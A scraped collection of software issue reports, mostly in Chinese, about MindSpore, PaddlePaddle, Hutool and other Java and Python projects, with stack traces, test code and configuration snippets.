[ST][MS][DOC]自动微分教程案例使用np初始化两个参数，默认类型为float64时，pynative模式会失败。,"https://www.mindspore.cn/tutorials/zh-CN/master/beginner/autograd.html ascend环境自动微分教程案例使用np初始化两个参数，默认类型为float64时,当使用图模式时，会自动降进度到fp32,但是pynative跑测直接报错： class Net(nn.Cell): def init(self): super(Net, self).init() self.w = Parameter(np.array([6.0]), name='w') self.b = Parameter(np.array([1.0]), name='b') 报错： [CRITICAL] DEVICE(52453,ffffaacd9480,python):2022-04-11-13:01:16.902.804 [mindspore/ccsrc/plugin/device/ascend/hal/device/kernel_select_ascend.cc:796] PrintNotMatchMessage] Can not select a valid kernel info for [Default/Mul-op1] in AI CORE or AI CPU kernel info candidates list: AI CORE: (, ) -&gt; () xxxxxx Please check the given data type or shape: AI CORE: : (&lt;Tensor[Float64], (1)&gt;, &lt;Tensor[Float64], (1)&gt;) -&gt; (&lt;Tensor[Float64], (1)&gt;) AI CPU: : (&lt;Tensor[Float64], (1)&gt;, &lt;Tensor[Float64], (1)&gt;) -&gt; (&lt;Tensor[Float64], (1)&gt;) / 硬件环境: /device ascend : -- MindSpore version :''[sha1]:a79657b0,[branch]:(HEAD,origin/r1.7,r1.7)'' -- Python version :Python 3.7.5 -- OS platform and distribution :eulerosv2r8.aarch64 -- GCC/Compiler version : (/): /mode pynative test_ms_tutorial_beginner_autograd_0001 下载教程用例 执行用例 用例执行成功   <code>: def construct(self, x): f = self.w * x + self.b return f"
ImportError: libmklml_intel.so: cannot open shared object file: No such file or directory,"在开放云的机器，原来版本是0.10.0, 遇到了多GPU预测结果错误的问题，所以升级了0.11.0。 升级方式，pip uninstall之后执行 （cuda8.0_cudnn5_avx_mkl版本） 跑任务时报： paddle version: 请问，有什么快速的方法能解决吗？   <code>: pip install paddlepaddle_gpu-0.11.0-cp27-cp27mu-linux_x86_64.whl Traceback (most recent call last): File ""mem_test.py"", line 15, in &lt;module&gt; paddle.init(use_gpu=False, trainer_count=1) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/__init__.py"", line 128, in init import py_paddle.swig_paddle as api File ""/usr/local/lib/python2.7/dist-packages/py_paddle/__init__.py"", line 15, in &lt;module&gt; from util import DataProviderWrapperConverter File ""/usr/local/lib/python2.7/dist-packages/py_paddle/util.py"", line 18, in &lt;module&gt; import swig_paddle File ""/usr/local/lib/python2.7/dist-packages/py_paddle/swig_paddle.py"", line 28, in &lt;module&gt; _swig_paddle = swig_import_helper() File ""/usr/local/lib/python2.7/dist-packages/py_paddle/swig_paddle.py"", line 24, in swig_import_helper _mod = imp.load_module('_swig_paddle', fp, pathname, description) ImportError: libmklml_intel.so: cannot open shared object file: No such file or directory /usr/local/bin/paddle: line 40: printf: PANIC:: invalid number PaddlePaddle 0.11.0, compiled with with_avx: ON with_gpu: ON with_mkl: ON with_mkldnn: ON with_double: OFF with_python: ON with_rdma: OFF with_timer: OFF"
DyGraph 动态图保存预测模型,"PaddlePaddle 1.5 问题 DyGraph 动态图没有提供保存预测模型的接口，跟Fluid的：save_inference_model 因为需要在 Paddle Mobile 中需求使用到预测模型，同时如果能够保存预测模型，在预测上就不需要再编写网络结构代码。 我尝试过使用 Executor 的方式训练 DyGraph 网络代码，但是在保存模型的时候出现问题   <code>: paddle.fluid.core_avx.EnforceNotMet: Invoke operator save error. Python Callstacks: File ""C:\Users\1596\AppData\Local\Programs\Python\Python35\lib\site-packages\paddle\fluid\framework.py"", line 1748, in append_op attrs=kwargs.get(""attrs"", None)) File ""C:\Users\1596\AppData\Local\Programs\Python\Python35\lib\site-packages\paddle\fluid\io.py"", line 213, in save_vars 'file_path': os.path.join(save_dirname, new_var.name) File ""C:\Users\1596\AppData\Local\Programs\Python\Python35\lib\site-packages\paddle\fluid\io.py"", line 191, in save_vars filename=filename) File ""C:\Users\1596\AppData\Local\Programs\Python\Python35\lib\site-packages\paddle\fluid\io.py"", line 509, in save_persistables filename=filename) File ""C:\Users\1596\AppData\Local\Programs\Python\Python35\lib\site-packages\paddle\fluid\io.py"", line 1087, in save_inference_model save_persistables(executor, save_dirname, main_program, params_filename) File ""D:/yeyupiaoling/PyCharm/TestDyGraph/test7.py"", line 222, in train executor=exe) File ""D:/yeyupiaoling/PyCharm/TestDyGraph/test7.py"", line 227, in &lt;module&gt; train() C++ Callstacks: Cannot open infer_model\mnist/MNIST_0/FC_0.b_0 to write at [E:\release_cuda87\paddle\paddle/fluid/operators/save_op.h:82] PaddlePaddle Call Stacks: Windows not support stack backtrace yet."
core.Operator should be removed,"We have a python API to instantiate an operator on the python end. https://github.com/PaddlePaddle/Paddle/blob/d3162339f6637114d515b4bc448fe4ae8cc81125/paddle/fluid/pybind/pybind.cc#L332-L368 We used it in our old version of . Since has been reimplemented to be executor based 6 months ago, I feel we would like to remove it. One major blocker of the removal the test of batch_norm: The latest modification of these two tests is one month ago by @chengduoZH. Is this intentional?   <code>: core.Operator op_test.py op_test.py λ 87acf7e45c5c /paddle/python/paddle/v2/fluid {remove_backward_cc} grep -rI ""core.Operator"" . grep: warning: GREP_OPTIONS is deprecated; please use an alias or script ./op.py: return core.Operator.create(opdesc.SerializeToString()) ./tests/unittests/test_batch_norm_op.py: backward_op = core.Operator.backward(op, no_grad_set) ./tests/unittests/test_layer_norm_op.py: backward_op = core.Operator.backward(op, no_grad_set) core.Operator"
【高校贡献】【mindspore】【nnunet】mindspore 图模式不支持lambda语法,"mindspore 图模式不支持lambda语法 Hardware Environment: GPU -- MindSpore version (1.5.0): -- Python version : 在图模式下会得到以下报错信息，   <code>: import mindspore.ops as ops import mindspore.nn as nn import mindspore from mindspore import context,Tensor softmax_helper = lambda x: ops.Softmax(-1)(x) class test(nn.Cell): def __init__(self, auto_prefix=True, flags=None): super().__init__(auto_prefix=auto_prefix, flags=flags) def construct(self, x): return softmax_helper(x) if __name__ == ""__main__"": context.set_context(mode=context.GRAPH_MODE, device_target=""GPU"", save_graphs=False) net = test() x = Tensor([1,2,3,4,5],dtype=mindspore.float32) print(net(x))"
[ST][MS/modelzoo][NET][unet][ascend]train fail ,"unet3d训练失败 / 硬件环境: /device ascend : -- MindSpore version :r1.9 commit_id:4e8cc723 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20220810 MindSpore 版本：编译时间202209 r1.9.0 commit_id:c915f9ed (/): /mode graph test_ms_model_zoo_unet_3D_ascend_train_infer_8p.py cd solution_test/cases/02network/00cv/inceptionv4/train/ pytest -s test_ms_model_zoo_unet_3D_ascend_train_infer_8p.py 网络训练成功 走给肖天赐   <code>: [CRITICAL] ME(67274:281473227485200,MainProcess):2022-09-08-16:28:25.874.449 [mindspore/dataset/engine/datasets.py:2904] Uncaught exception: Traceback (most recent call last): File ""train.py"", line 97, in &lt;module&gt; run_distribute=config.run_distribute) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/Unet_3D/Test_ms_model_zoo_unet_3D_ascend_train_infer_8p/scripts/train_parallel0/src/model_utils/moxing_adapter.py"", line 104, in wrapped_func run_func(*args, **kwargs) File ""train.py"", line 92, in train_net model.train(config.epoch_size, train_dataset, callbacks=callbacks_list, dataset_sink_mode=False) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 1050, in train initial_epoch=initial_epoch) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 98, in wrapper func(self, *args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 617, in _train self._train_process(epoch, train_dataset, list_callback, cb_params, initial_epoch, valid_infos) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 895, in _train_process for next_element in dataset_helper: File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/dataset_helper.py"", line 622, in __next__ data = self.iter.__next__() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/dataset/engine/iterators.py"", line 140, in __next__ data = self._get_next() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/dataset/engine/iterators.py"", line 252, in _get_next return [self._transform_md_to_output(t) for t in self._iterator.GetNextAsList()] RuntimeError: Exception thrown from PyFunc. map operation: [PyFunc] failed. Error description: FileNotFoundError: Caught FileNotFoundError in map(or batch) worker and execute Python function. Original Traceback (most recent call last): File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/nibabel/loadsave.py"", line 42, in load stat_result = os.stat(filename) FileNotFoundError: [Errno 2] No such file or directory: ""['/home/workspace/mindspore_dataset//luna16/train/image/1.3.6.1.4.1.14519.5.2.1.6279.6001.159665703190517688573100822213.nii.gz']"""
[CT][MS][dump]parameter  x can't dump,": /device gpu : -- MindSpore version :master -- Python version :3.7 -- OS platform and distribution :Linux -- GCC/Compiler version : --COMMITID(): 1aefa5fe10 test_e2e_dumpdata_iteration2_mode1 cd /home/wys/dump/MindSporeTest/dumpdata pytest -v test_e2e_dumpdata.py::test_e2e_dumpdata_iteration2_mode1 &amp;&gt;1.log { ""common_dump_settings"": { ""dump_mode"": 1, ""path"": ""/tmp/dumpdata/"", ""net_name"": ""net020"", ""iteration"": ""all"", ""input_output"": 2, ""kernels"": [ ""x"" ], ""support_device"": [ 0, 1, 2, 3, 4, 5, 6, 7 ] }, ""async_dump_settings"": { ""enable"": false, ""op_debug_mode"": 0 }, ""e2e_dump_settings"": { ""enable"": true, ""trans_flag"": false } } parameter x can't dump case pass E AssertionError: assert False E + where False = &lt;function exists at 0x7fe9a721e320&gt;('/tmp/dumpdata/rank_0/net020/0/1') E + where &lt;function exists at 0x7fe9a721e320&gt; = &lt;module 'posixpath' from '/root/miniconda3/envs/wys/lib/python3.7/posixpath.py'&gt;.exists E + where &lt;module 'posixpath' from '/root/miniconda3/envs/wys/lib/python3.7/posixpath.py'&gt; = os.path test_e2e_dumpdata.py:674: AssertionError ----------------------------- Captured stderr call ----------------------------- [INFO] COMMON(20931,7fe9a7342740,python):2021-06-30-16:31:38.806.375 [mindspore/core/utils/ms_context.h:219] set_param&lt;std::__cxx11::basic_string &gt;] ms set context device target:GPU [INFO] COMMON(20931,7fe9a7342740,python):2021-06-30-16:31:38.806.428 [mindspore/core/utils/ms_context.h:219] set_param&lt;std::__cxx11::basic_string &gt;] ms set context device target:GPU [INFO] COMMON(20931,7fe9a7342740,python):2021-06-30-16:31:38.806.484 [mindspore/core/utils/ms_context.h:219] set_param&lt;std::__cxx11::basic_string &gt;] ms set context device target:GPU [INFO] COMMON(20931,7fe9a7342740,python):2021-06-30-16:31:38.806.503 [mindspore/core/utils/ms_context.h:219] set_param&lt;std::__cxx11::basic_string &gt;   <code>: ''' TEST_SUMMARY:迭代次数为2，iteration设置为1，mode为1 ''' def test_e2e_dumpdata_iteration2_mode1(): context.set_context(save_graphs=True) exportconfpath = os.getcwd() + '/conf/20/e2e_dump_config_0.json' os.environ['MINDSPORE_DUMP_CONFIG'] = exportconfpath epoch = 2 fact = DumpDataFactory() fact.train_addnet(epoch) datafilepath = '/tmp/dumpdata/rank_0/net020/0/{}'.format(1) assert os.path.exists(datafilepath) inputfilex = get_string_with_target('Parameter.x.0.0*output.0*', datafilepath) inputdatax = np.load(os.path.join(datafilepath, inputfilex)) allclose_nparray(inputdatax, fact.input_x.asnumpy(), 0.0001, 0.0001) for i in range(1, 8): assert not os.path.exists('/tmp/dumpdata/rank_{}/net017'.format(i)) def test_e2e_dumpdata_iteration2_mode1(): context.set_context(save_graphs=True) exportconfpath = os.getcwd() + '/conf/20/e2e_dump_config_0.json' os.environ['MINDSPORE_DUMP_CONFIG'] = exportconfpath epoch = 2 fact = DumpDataFactory() fact.train_addnet(epoch) datafilepath = '/tmp/dumpdata/rank_0/net020/0/{}'.format(1) assert os.path.exists(datafilepath)"
keys方法返回值的坑,"做监控的时候用的这个方法,发现有个坑：一级缓存返回值是key，二级缓存返回值可能是region+"":""+key或者namespce+"":""+region+"":""+key。 临时解决办法如下：   <code>: public Collection&lt;String&gt; keys(String region) { if(closed) throw new IllegalStateException(""CacheChannel closed""); Set&lt;String&gt; keys = new HashSet&lt;&gt;(); keys.addAll(holder.getLevel1Cache(region).keys()); keys.addAll(holder.getLevel2Cache(region).keys()); return keys; } public Collection&lt;String&gt; keys(String region) { if(closed) throw new IllegalStateException(""CacheChannel closed""); Set&lt;String&gt; keys = new HashSet&lt;&gt;(); keys.addAll(holder.getLevel1Cache(region).keys()); Collection&lt;String&gt; key2s = holder.getLevel2Cache(region).keys(); String separator = "":""; Set&lt;String&gt; key2ss = key2s.stream().map(k-&gt;{ final int pos = k.lastIndexOf(separator); if (pos == -1 || pos == k.length() - separator.length()) { return k; } return k.substring(pos + separator.length()); }).collect(Collectors.toSet()); keys.addAll(key2ss); return keys; }"
Static code check fix,"Several defect should be fixed: in fs/fat/os_adapt/fatfs.c (380 - 383) bit operation should only apply to unsigned variable in fs/fat/os_adapt/fatfs.c (896 - 900) that part is null is not checked <ol start=""3""> in fs/fat/os_adapt/fatfs.c (1181 - 1192) time.tm_isdst is not initialized <ol start=""4""> in in fs/fat/os_adapt/fatfs.c (1623 - 1625) bit operation should only apply to unsigned variable   <code>: dp-&gt;dir[DIR_Attr] = AM_ARC; if ((mode &amp; S_IWUSR) == 0) { dp-&gt;dir[DIR_Attr] |= AM_RDO; } part = los_part_find(blk_driver); if (part-&gt;part_name != NULL) { bops-&gt;close(blk_driver); return EBUSY; } static time_t fattime_transfer(WORD fdate, WORD ftime) { struct tm time; time.tm_sec = GET_SECONDS(ftime); time.tm_min = GET_MINUTES(ftime); time.tm_hour = GET_HOURS(ftime); time.tm_mday = GET_DAY(fdate); time.tm_mon = GET_MONTH(fdate); time.tm_year = GET_YEAR(fdate) + YEAR_OFFSET; /* Year start from 1980 in FATFS */ time_t ret = mktime(&amp;time); return ret; } if (sectors &lt; 0 || sectors &gt; FAT32_MAX_CLUSTER_SIZE || (sectors &amp; (sectors - 1))) { return -EINVAL; }"
error about unsupported/Eigen/CXX11/Tensor,"I found a compile issue paddle/platform/device_context.h:25:42: fatal error: unsupported/Eigen/CXX11/Tensor: No such file or directory #include &lt;unsupported/Eigen/CXX11/Tensor&gt; This error sometimes occurred sometimes not, seems about the third party need dependency? My   <code>: cmake3.5.2"
头像保存出错,"相关的错误日志如下： 貌似是数据库存储的 picture （blob类型）不能与 """" 进行比较，所以出现了错误。 目前我只能手动清空数据库中的 picture 字段，并提醒用户不要上传头像。   <code>: SEVERE: Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is freemarker.core._MiscTemplateException: Can't compare values of these types. Allowed comparisons are between two numbers, two strings, two dates, or two booleans. Left hand operand is a sequence (wrapper: f.t.SimpleSequence). Right hand operand is a string (wrapper: f.t.SimpleScalar). The blamed expression: ==&gt; model.picture? default("""")=="""" [in template ""profile/myProfile.ftl"" at line 316, column 55] ---- FTL stack trace (""~"" means nesting-related): - Failed at: #if model.picture?default("""") == """" [in template ""profile/myProfile.ftl"" at line 316, column 49] ----] with root cause FreeMarker template error: Can't compare values of these types. Allowed comparisons are between two numbers, two strings, two dates, or two booleans. Left hand operand is a sequence (wrapper: f.t.SimpleSequence). Right hand operand is a string (wrapper: f.t.SimpleScalar). The blamed expression: ==&gt; model.picture? default("""")=="""" [in template ""profile/myProfile.ftl"" at line 316, column 55] ---- FTL stack trace (""~"" means nesting-related): - Failed at: #if model.picture?default("""") == """" [in template ""profile/myProfile.ftl"" at line 316, column 49] ---- Java stack trace (for programmers): ---- freemarker.core._MiscTemplateException: [... Exception message was already printed; see it above ...]"
Need Python API to save models in refactored Paddle,"Currently, can be saved by (in review: https://github.com/PaddlePaddle/Paddle/pull/4602) and can also be easily serialised and saved. However, we don't have a unified Python API to invoke them.   <code>: variables save op ProgramDesc"
DateUtil.parse()能不能指定该时间是哪个时区的?,"JDK版本： openjdk_8_201 hutool版本： 5.8.2 比如有个时间字符串 , 如果这是北京时间, 则其时间戳应为; 如果这是东京时间, 则时间戳应该为, 对应的北京时间应为. 目前使用都是默认机器所处的时区来的, 如果是在容器中运行, 但未指定时区, 解析一个北京时间字符串, 则会导致解析后的时间快8个小时. 所以现在只能先后, 再成对应时区的时间字符串, 再后. 不知道有啥好办法 带参数的那个也不能满足要求...   <code>: 2022-05-28 21:25:30 1653744330000 1653740730000 2022-05-28 20:25:30 DateUtil.parse() parse setTimeZone toString() parse getTime Locale"
paddle中的语言模型怎么在训练的时候计算整个句子的似然概率？,"看generate_sequence_by_rnn_lm这个demo里是这么写的，最终infer的时候是得到最后一个词预测下一个词的概率，如下所示： 现在我想利用训练好的模型得到整个句子的似然概率，paddle里有没有对应的layer？   <code>: # fc(full connected) and output layer output = paddle.layer.fc( input=[rnn_cell], size=vocab_dim, act=paddle.activation.Softmax()) if is_infer: last_word = paddle.layer.last_seq(input=output) return last_word"
【优化】503 服务实例不可用时，明确提示,"环境信息 pigx版本: 4.1 是否修改包名: 否 提供详细 当服务实例不可用时候，前台页面也没有提示   <code>: {""code"":1,""msg"":""503 SERVICE_UNAVAILABLE \""No instance available for pigx-auth\"""",""data"":null}"
weblogic环境发送基于sni协议的htpps请求报Hostname verification failed,"使用的JDK版本:1.7.80，Hutool版本:4.1.8 HttpUtil.post(""https:"")在tomcate环境运行正常，在weblogic环境报Hostname verification failed 。 public HttpConnection(String urlStr, Method method, HostnameVerifier hostnameVerifier, SSLSocketFactory ssf, int timeout, Proxy proxy) { if (StrUtil.isBlank(urlStr)) { throw new HttpException(""Url is blank !""); } if (Validator.isUrl(urlStr) == false) { throw new HttpException(""{} is not a url !"", urlStr); } // 去掉url中的空白符，防止空白符导致的异常 urlStr = StrUtil.cleanBlank(urlStr); //修改代码，添加判断https链接，若是直接由用sun的httpshandler,而不用web服务器提供的。 if(urlStr.indexOf(""https"")&gt;=0){ this.url =URLUtil.url(urlStr,new sun.net.www.protocol.https.Handler()); }else{ this.url = URLUtil.url(urlStr); } Hostname verification failed: HostnameVerifier=weblogic.security.utils.SSLWLSHostnameVerifier at cn.hutool.http.HttpResponse.init(HttpResponse.java:332) at cn.hutool.http.HttpResponse.(HttpResponse.java:61) at cn.hutool.http.HttpRequest.execute(HttpRequest.java:729) at cn.hutool.http.HttpRequest.execute(HttpRequest.java:696) at cn.hutool.http.HttpUtil.get(HttpUtil.java:229) at cn.hutool.http.HttpUtil.get(HttpUtil.java:217) 希望大神帮忙建议更好的方法，以避免侵入修改你的代码。   <code>: 查了一下，原因是默认情况下，当 WebLogic Server 实例充当 SSL 客户端角色（它会尝试通过 SSL 连接到其他服务器或应用程序）时，它会验证 SSL 服务器在数字证书中返回的主机名是否与用于连接 SSL 服务器的 URL 主机名相匹配。如果主机名不匹配，则删除此连接。因此weblogic不支持https的sni协议的主机名验证。 在网上搜索文章将cn.hutool.http.HttpConnection的初始化方法改为如下既可以解决该报错问题： this.method = ObjectUtil.isNull(method) ? Method.GET : method; this.proxy = proxy; try { this.conn = openHttp(hostnameVerifier, ssf); } catch (Exception e) { throw new HttpException(e.getMessage(), e); } if (timeout &gt; 0) { this.setConnectionAndReadTimeout(timeout); } initConn(); }"
优化演示网站,现在WASM页面性能不是不是很好，在快速滚动 时候回卡顿一下。 优化示例代码展示 现在演示的Razor 代码和C#后端代码分别在不同标签中。 我要想看演示代码中 某个示例内容， 就要反复切换标签浏览， 因为不能自动定位， 看看razor 在换到C#代码， 还给重新定位。 预期   <code>: 希望能像类似 JSFiddle 这种代码沙箱的样式，把每个示例单独放入一个环境中。
ContextProjectionOpTest和test_matrixCompare在GPU环境下，单测失败,"Apr 11, 2017的最新develop分支，有两个单测在gpu环境下失败： 另，请问GPU环境下的单测系统什么时候可以用呢？@HelinWang   <code>: Start 6: ContextProjectionOpTest 6: Test command: /home/luotao/Paddle/build/paddle/function/ContextProjectionOpTest 6: Test timeout computed to be: 9.99988e+06 6: I0411 16:26:33.918200 29887 Util.cpp:166] commandline: /home/luotao/Paddle/build/paddle/function/ContextProjectionOpTest 6: [==========] Running 1 test from 1 test case. 6: [----------] Global test environment set-up. 6: [----------] 1 test from ContextProjection 6: [ RUN ] ContextProjection.Projection 6: F0411 16:26:35.131664 29887 Function.h:41] Cannot get key begin_pad with error bad any cast 6: *** Check failure stack trace: *** 6: @ 0x8cc88d google::LogMessage::Fail() 6: @ 0x8d033c google::LogMessage::SendToLog() 6: @ 0x8cc3b3 google::LogMessage::Flush() 6: @ 0x8d184e google::LogMessageFatal::~LogMessageFatal() 6: @ 0x6efdd0 paddle::FuncConfig::get&lt;&gt;() 6: @ 0x6f0976 paddle::ContextProjectionForwardFunc&lt;&gt;::init() 6: @ 0x5a190f paddle::FunctionCompare::FunctionCompare() 6: @ 0x59e0eb testMatrixProjectionForward() 6: @ 0x59e79d ContextProjection_Projection_Test::TestBody() 6: @ 0x9b77c3 testing::internal::HandleExceptionsInMethodIfSupported&lt;&gt;() 6: @ 0x9aa9d7 testing::Test::Run() 6: @ 0x9aaa7e testing::TestInfo::Run() 6: @ 0x9ab2bd testing::TestCase::Run() 6: @ 0x9af0a5 testing::internal::UnitTestImpl::RunAllTests() 6: @ 0x9af350 testing::UnitTest::Run() 6: @ 0x59ceb0 main 6: @ 0x318ae1ecdd (unknown) 6: @ 0x59d1f1 (unknown) test 23 Start 23: test_matrixCompare 23: Test command: /home/luotao/Paddle/build/paddle/math/tests/test_matrixCompare 23: Test timeout computed to be: 9.99988e+06 23: I0411 16:27:20.541667 888 Util.cpp:166] commandline: /home/luotao/Paddle/build/paddle/math/tests/test_matrixCompare 23: [==========] Running 14 tests from 3 test cases. 23: [----------] Global test environment set-up. 23: [----------] 11 tests from Matrix 23: [ RUN ] Matrix.maxSequence 23: [ OK ] Matrix.maxSequence (221 ms) 23: [ RUN ] Matrix.unary 23: F0411 16:27:22.011467 888 MathFunctions.cpp:95] Not implemented 23: *** Check failure stack trace: *** 23: @ 0x8d6b1d google::LogMessage::Fail() 23: @ 0x8da5cc google::LogMessage::SendToLog() 23: @ 0x8d6643 google::LogMessage::Flush() 23: @ 0x8dbade google::LogMessageFatal::~LogMessageFatal() 23: @ 0x726815 paddle::getrf&lt;&gt;() 23: @ 0x73d43f paddle::CpuMatrix::inverse() 23: @ 0x5a515d testMatrixInverse() 23: @ 0x5a53b2 Matrix_unary_Test::TestBody() 23: @ 0x9c5293 testing::internal::HandleExceptionsInMethodIfSupported&lt;&gt;() 23: @ 0x9b8597 testing::Test::Run() 23: @ 0x9b863e testing::TestInfo::Run() 23: @ 0x9b8e7d testing::TestCase::Run() 23: @ 0x9bcc65 testing::internal::UnitTestImpl::RunAllTests() 23: @ 0x9bcf10 testing::UnitTest::Run() 23: @ 0x5a0c40 main 23: @ 0x318ae1ecdd (unknown) 23: @ 0x5a0fe1 (unknown) 1/1 Test #23: test_matrixCompare ...............***Exception: Other 2.17 sec"
StrUtil.format引起的log4j日志打印时，输出参数里占位符不支持下标。,"JDK版本： openjdk_8_201 hutool版本： 5.8.9 <ol start=""3""> 希望占位符中可以兼容实现填写下标、不填写下标两种情况，均能正常替换参数。   <code>: @Test public void test3() { String msg = StrUtil.format(""我昨天从{}坐{}到{}。"", ""武汉"", ""火车"", ""北京""); Assert.assertEquals(msg, ""我昨天从武汉坐火车到北京。""); msg = StrUtil.format(""我昨天从{0}坐{1}到{2}。"", ""武汉"", ""火车"", ""北京""); Assert.assertNotEquals(msg, ""我昨天从武汉坐火车到北京。""); }"
interpolate报错,"platform: AIStudio Version: 2.1.2   <code>: A = paddle.randn([2400, 64, 32, 32]) x = F.interpolate(x=A, size=[128, 128], mode='bilinear', align_corners=True) ---------------------------------------------------------------------------ValueError Traceback (most recent call last)&lt;ipython-input-25-dfbf0bc222bc&gt; in &lt;module&gt; 1 A = paddle.randn([2400, 64, 32, 32]) ----&gt; 2 x = F.interpolate(x=A, size=[128, 128], mode='bilinear', align_corners=True) /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/nn/functional/common.py in interpolate(x, size, scale_factor, mode, align_corners, align_mode, data_format, name) 455 out = core.ops.linear_interp_v2(x, *dy_attr) 456 if resample_type == ""bilinear"": --&gt; 457 out = core.ops.bilinear_interp_v2(x, *dy_attr) 458 if resample_type == ""trilinear"": 459 out = core.ops.trilinear_interp_v2(x, *dy_attr) ValueError: (InvalidArgument) element count should be greater than 0, but received value is: -1778384896. [Hint: Expected element_count &gt; 0, but received element_count:-1778384896 &lt;= 0:0.] (at /paddle/paddle/fluid/platform/gpu_launch_config.h:55) [operator &lt; bilinear_interp_v2 &gt; error]"
[CT][MS][OP]nonmaxsuppressionv3 some case is stuck at ascend pynative mode,"Hardware Environment(): /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 执行测试用例 在pynative 模式下， 这两条用例都会卡住， 没有结果 不卡住，执行完成   <code>: def test_nonmaxsuppressionv3_iou_threshold_number_float_value_large_than_1(): boxes = Tensor(np.random.randn(25, 4), mstype.float32) scores = Tensor(np.random.randn(25, ), mstype.float32) max_output_size = Tensor(np.random.randint(0, 200), mstype.int64) iou_threshold = 3.5 score_threshold = 2.9 fact = NonMaxSuppressionV3Mock( inputs=[boxes, scores, max_output_size, iou_threshold, score_threshold]) fact.forward_mindspore_impl() fact.forward_cmp() def test_nonmaxsuppressionv3_iou_threshold_tensor_value_less_than_0(): boxes = Tensor(np.random.randn(25, 4), mstype.float32) scores = Tensor(np.random.randn(25, ), mstype.float32) max_output_size = Tensor(np.random.randint(0, 200), mstype.int64) iou_threshold = Tensor(-3.5, mstype.float32) score_threshold = Tensor(3, mstype.float32) fact = NonMaxSuppressionV3Mock( inputs=[boxes, scores, max_output_size, iou_threshold, score_threshold]) fact.forward_cmp()"
pynative ut cpp: TestPynativeExecute only tests the creation of MsContest,"Environment: MindSpore 1.2.0 source Description: 目前tests/ut/cpp/pynative/pynative_execute_test.cc中只有两个对MsContext的测试用例： 这两个测试用例只是测试了MsContext的创建与设置backend_policy，不涉及pynative_execute的测试，如PynativeExecutor, ForwardExecutor, GradExecutor等。是否需要添加相应的测试用例？   <code>: TEST_F(TestPynativeExecute, TestCreateContext) { auto ctx3 = MsContext::GetInstance(); ASSERT_EQ(ctx3-&gt;backend_policy(), ""vm""); ASSERT_EQ(ctx3-&gt;get_param&lt;std::string&gt;(MS_CTX_DEVICE_TARGET), ""CPU""); ctx3-&gt;set_backend_policy(""ge_only""); ctx3-&gt;set_param&lt;std::string&gt;(MS_CTX_DEVICE_TARGET, ""GPU""); auto ctx4 = MsContext::GetInstance(); ASSERT_EQ(ctx3.get(), ctx4.get()); ASSERT_EQ(ctx4-&gt;backend_policy(), ""ge_only""); ASSERT_EQ(ctx4-&gt;get_param&lt;std::string&gt;(MS_CTX_DEVICE_TARGET), ""GPU""); } TEST_F(TestPynativeExecute, TestDefaultContext) { auto ctx = MsContext::GetInstance(); ASSERT_EQ(std::string(ctx-&gt;backend_policy()), ""ge_only""); auto ctx2 = MsContext::GetInstance(); ASSERT_EQ(ctx.get(), ctx2.get()); }"
编译错误： ld: cannot find -lpybind,"develop分支， #21569 cmake参数 , 不会引入pybind11依赖   <code>: --WITH_PYTHON=OFF"
springFox ->3.0.0 knife4j -> 3.0.2   文档类型 OAS_30   图片上传参数无法显示,"生成文档如下 希望可以看一看   <code>: { ""openapi"": ""3.0.3"", ""info"": { ""title"": ""xxxxx"", ""description"": ""接口文档By-&gt;BarryDeng"", ""termsOfService"": ""www.apache.org"", ""contact"": { ""name"": ""xxx"", ""url"": ""https://www.cnblogs.com/TJ21/"", ""email"": ""tiaxiang_deng@sina.com"" }, ""version"": ""1.0"" }, ""servers"": [ { ""url"": ""http://localhost:8068"", ""description"": ""Inferred Url"" } ], ""paths"": { ""/web/open/upload_file"": { ""post"": { ""tags"": [ ""开放接口，无需登录"" ], ""summary"": ""文件上传-头像"", ""operationId"": ""uploadFileUsingPOST"", ""parameters"": [ { ""name"": ""md5"", ""in"": ""query"", ""description"": ""md5"", ""required"": false, ""style"": ""form"", ""allowReserved"": false, ""schema"": { ""type"": ""string"" } } ], ""requestBody"": { ""content"": { ""application/json"": { ""schema"": { ""type"": ""string"", ""format"": ""binary"" } }, ""application/octet-stream"": { ""schema"": { ""type"": ""string"", ""format"": ""binary"" } } } }, ""responses"": { ""200"": { ""description"": ""OK"", ""content"": { ""*/*"": { ""schema"": { ""$ref"": ""#/components/schemas/ApiResult?string?"" } } } }, ""201"": { ""description"": ""Created"" }, ""401"": { ""description"": ""Unauthorized"" }, ""403"": { ""description"": ""Forbidden"" }, ""404"": { ""description"": ""Not Found"" } }, ""extensions"": { ""x-author"": ""xxx"", ""x-order"": ""2147483647"" } } } }, ""components"": {} }"
"""change device context to pointer""","change to pointer instead of reference in . Because our DeviceContext is a base class, to achieve polymorphism, it should not be a reference.   <code>: const platform::DeviceContext ExecutionContext"
all error stack information: out of memory at (/paddle/paddle/fluid/platform/device_context.cc:221),Check out this page to find out much more about markdown.   <code>: how do you run your code? what system do you use? Are you using GPU or not?
jwt 获取数据类型转换错误,"设置userId 获取userId 报错：   <code>: BigInteger userId = user.getId(); setJwtAttr(""userId"", user.getId()); BigInteger userId = (BigInteger) getJwtPara(""userId""); Cannot cast 'java.lang.Integer' to 'java.math.BigInteger'"
